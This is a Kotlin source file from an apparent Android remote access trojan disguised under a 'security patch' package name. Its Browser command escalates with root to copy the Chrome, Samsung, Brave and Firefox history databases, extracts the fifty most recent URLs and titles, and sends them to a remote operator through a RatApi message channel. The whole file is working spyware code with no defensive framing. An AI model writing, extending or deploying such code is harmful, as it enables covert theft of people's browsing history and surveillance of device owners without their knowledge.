package com.android.security.patch.commands

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.security.patch.RatApi
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object Browser {

    private data class Target(val name: String, val dbPath: String)

    fun open(ctx: Context, chatId: Long, args: Array<String>) {
        val which = args.getOrNull(0)?.lowercase() ?: "all"
        RatApi.sendMessage(ctx, "reading browser history...", chatId)
        Thread {
            try {
                val targets = mutableListOf<Target>()
                if (which == "all" || which == "chrome") {
                    targets.add(Target("Chrome", "/data/data/com.android.chrome/app_chrome/Default/History"))
                }
                if (which == "all" || which == "samsung" || which == "sbrowser") {
                    targets.add(Target("Samsung", "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/History"))
                }
                if (which == "all" || which == "firefox") {
                    targets.add(Target("Firefox", "/data/data/org.mozilla.firefox/files/places.sqlite"))
                }
                if (which == "all" || which == "brave") {
                    targets.add(Target("Brave", "/data/data/com.brave.browser/app_chrome/Default/History"))
                }

                val out = StringBuilder()
                var any = false

                for (t in targets) {
                    val lines = readHistory(ctx, t)
                    if (lines.isNotEmpty()) {
                        any = true
                        out.append("<b>${t.name}</b>\n")
                        out.append(lines.joinToString("\n"))
                        out.append("\n\n")
                    }
                }

                if (!any) {
                    RatApi.sendMessage(ctx, "no browser history readable (need root + browser installed)", chatId)
                } else {
                    val full = out.toString()
                    if (full.length > 3800) {
                        RatApi.sendDocument(ctx, full.toByteArray(), "browser_history.html",
                            "browser history", chatId)
                    } else {
                        RatApi.sendMessage(ctx, full, chatId)
                    }
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "browser err: ${e.message}", chatId)
            }
        }.start()
    }

    private fun readHistory(ctx: Context, t: Target): List<String> {
        val src = File(t.dbPath)
        if (!src.exists()) return emptyList()
        val tmp = File(ctx.cacheDir, "b_${t.name}.db")
        try {
            // copy via root (file biasanya 600 owner)
            val p = ProcessBuilder("su", "-c", "cp \"${t.dbPath}\" \"${tmp.absolutePath}\" && chmod 644 \"${tmp.absolutePath}\"")
                .redirectErrorStream(true).start()
            p.inputStream.bufferedReader().readText()
            p.waitFor()
            if (!tmp.exists()) return emptyList()

            val db = SQLiteDatabase.openDatabase(tmp.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
            val out = mutableListOf<String>()
            try {
                val c = db.rawQuery(
                    "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50",
                    null
                )
                c.use {
                    while (it.moveToNext() && out.size < 50) {
                        val url = it.getString(0) ?: ""
                        val title = it.getString(1) ?: ""
                        val t0 = it.getLong(2)
                        // chrome timestamp = microsec since 1601
                        val epoch = if (t0 > 0) (t0 / 1000) - 11644473600000L else 0L
                        val fmt = if (epoch > 0) {
                            SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(Date(epoch))
                        } else ""
                        out.add("[${fmt}] <a href=\"${url.take(80)}\">${title.take(60)}</a>")
                    }
                }
            } catch (_: Throwable) {}
            try { db.close() } catch (_: Throwable) {}
            try { tmp.delete() } catch (_: Throwable) {}
            return out
        } catch (_: Throwable) {
            try { tmp.delete() } catch (_: Throwable) {}
            return emptyList()
        }
    }
}
